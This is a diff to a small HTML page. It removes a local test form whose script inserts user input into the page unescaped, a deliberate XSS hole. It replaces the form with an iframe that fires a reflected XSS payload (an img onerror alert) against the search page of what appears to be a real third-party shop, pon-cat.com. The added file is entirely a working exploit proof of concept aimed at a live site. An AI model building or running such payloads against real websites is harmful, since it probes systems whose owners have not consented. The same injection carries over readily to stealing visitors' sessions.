@@ -1,21 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Local XSS Test</title>
+  <title>XSS Injection via Iframe</title>
 </head>
 <body>
-  <form id="search-form" action="#">
-    <input name="query" type="text" value="" placeholder="Type a keyword">
-    <button type="submit">Submit</button>
-  </form>
-
-  <script type="text/javascript">
-    document.querySelector('#search-form').addEventListener('submit', function(e) {
-      e.preventDefault(); // Prevent form submission for testing
-      var value = document.querySelector('[name="query"]').value;
-      // Simulate processing of the input (e.g., reflecting it somewhere)
-      document.body.innerHTML += `<div>${value}</div>`;
-    });
-  </script>
+  <iframe src="https://www.pon-cat.com/nl/search?query=%22%3E<img%20src=x%20onerror=alert(%27Automated%20XSS%27)%3E" width="100%" height="100%" style="border:none;"></iframe>
 </body>
 </html>
